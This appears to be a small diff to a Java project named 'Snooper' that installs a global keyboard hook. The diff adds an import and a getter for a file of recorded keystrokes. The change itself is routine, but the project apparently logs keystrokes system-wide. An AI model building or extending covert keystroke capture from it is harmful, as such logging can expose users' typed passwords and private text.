@@ -2,6 +2,7 @@ package com.snooper.tray;
 
 import com.snooper.*;
 import com.snooper.app.*;
+import com.snooper.app.controller.*;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
@@ -60,6 +61,10 @@ public class Snooper extends NativeKeyAdapter implements Disposable {
 	
 	public TrayIcon getTrayIcon() {
 		return trayIcon;
+	}
+	
+	public File getKeyStrokesFile() {
+		return keyStrokesFile;
 	}
 	
 	public Snooper() {
